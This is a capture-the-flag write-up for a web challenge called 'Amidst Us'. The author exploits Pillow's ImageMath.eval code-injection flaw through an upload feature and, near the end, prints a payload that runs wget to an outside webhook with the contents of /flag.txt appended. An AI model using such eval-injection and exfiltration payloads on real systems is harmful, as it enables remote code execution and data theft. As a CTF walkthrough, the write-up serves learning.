# Amidst Us

We start off with a weird page where we can select a color that does not seem to do anything:

<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

When clicking in the spaceship at the center of the website we can click on it and upload a file:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If i upload a php reverseshell.php i get blocked but if i submit a reverseshell.php.jpg it seems to send at least a request:

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

But i did not manage to do anything with that so i came back and tried to go slower:

I just go and look at how the app reacts when i upload a normal hackergobrrr.png image:

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Then i went and looked at how the image was treated since there was some sort of b64 string directly related to it and saw this:



and when i googled what this was i saw the first link that seemed interesting:

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and indeed we have this function:

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So after googling around this exploit i found this:

{% embed url="https://github.com/advisories/GHSA-8vj2-vxx3-667w" %}

`PIL.ImageMath.eval` in Pillow before 9.0.0 allows evaluation of arbitrary expressions, such as ones that use the Python exec method `ImageMath.eval("exec(exit())")`.

so we need to take that and craft something that would lead to RCE or file reading:

```
ImageMath.eval("__import__('os').system('wget https://webhook.site/aa31223b-35e4-4679-aa22-8ea194c82870?flag=$(cat /flag.txt)')")
```

i put my payload in the eval function so everyone can see how the imagemath would handle it, so here we import os and send a request to a webhook server that i own and append the flag to the request so we can exfiltrate it:

<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I replace one of the 3 values with my payload and hit send and look at my webhook:

<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And it's flagged&#x20;
